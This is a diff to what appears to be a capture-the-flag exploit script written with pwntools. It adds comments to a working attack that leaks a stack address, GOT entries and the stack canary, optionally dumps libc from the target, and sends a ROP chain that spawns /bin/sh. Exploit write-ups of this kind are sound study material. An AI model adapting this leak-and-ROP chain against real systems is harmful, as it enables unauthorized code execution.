@@ -2,6 +2,9 @@ from pwn import *
 import numpy as np
 from sys import exit
 
+# you were supposed to have to suck the libc out 12 bytes at a time, but that
+# failed. oh well. still fun.
+
 def put(r, s):
     if len(s)%12:
         s += '\n'
@@ -46,6 +49,8 @@ def main():
     else:
         r = process(e.path)
         gdb.attach(r, "b print_menu")
+
+    # get buffer location
     r.sendline("3")
     r.sendline("-4")
     r.recvuntil("ID: ")
@@ -53,21 +58,22 @@ def main():
     log.success("leaked stack addr: " + hex(np.uint32(stack_leak)))
     bufaddr = stack_leak
 
+    # leak out libc addr and canary
     leaked_puts = u32(get(r, bufaddr, e.sym['got.puts'], 4))
     leaked_memcpy = u32(get(r, bufaddr, e.sym['got.memcpy'], 4))
     leaked_canary = u32(get(r, bufaddr, bufaddr+68, 4))
-
     log.success("puts: " + hex(leaked_puts))
     log.success("memcpy: " + hex(leaked_memcpy))
     log.success("canary: " + hex(leaked_canary))
 
+    # pull start of libc from the target
     if args['GETLIBC']:
         libcbuf = ""
         cur = leaked_puts - 50
         while elfhead not in libcbuf[:55]:
             libcbuf = get(r, bufaddr, cur, 50) + libcbuf
             cur -= 50
-	libcbuf = libcbuf[libcbuf.find(elfhead):]
+        libcbuf = libcbuf[libcbuf.find(elfhead):]
         puts_off = len(libcbuf)
     else:
         puts_off = args.get('PUTSOFF', 0x64da0) # insert puts off found here
@@ -75,6 +81,7 @@ def main():
     libc_base = leaked_puts - puts_off
     log.success("libc base: {}, puts offset: {}".format(hex(libc_base), hex(puts_off)))
 
+    # pull the rest of libc from the target then exit
     if args['GETLIBC']:
         toget = 1736650 # make this number pretty big
         cur = leaked_puts
@@ -91,6 +98,7 @@ def main():
     for k in gadgets.iterkeys():
         gadgets[k] += libc_base
 
+    # build rop chain, use know buffers for args
     buf1 = str(int(u16("-c"))) + "\n" + "/bin/sh"
     buf2 = str(int(np.uint32(bufaddr))) + "\n" + p32(np.uint32(bufaddr)) + p32(np.uint32(bufaddr+8))
     buf3 = "A"*32 + p32(leaked_canary) + "B"*12
@@ -103,6 +111,7 @@ def main():
     # eax = 0xb; syscall
     buf3 += p32(gadgets['inc_eax'])*0xb + p32(gadgets["int80"])*4
 
+    # send payload, get shell
     log.info("Sending payload...")
     r.sendline("1")
     r.sendline(buf1)
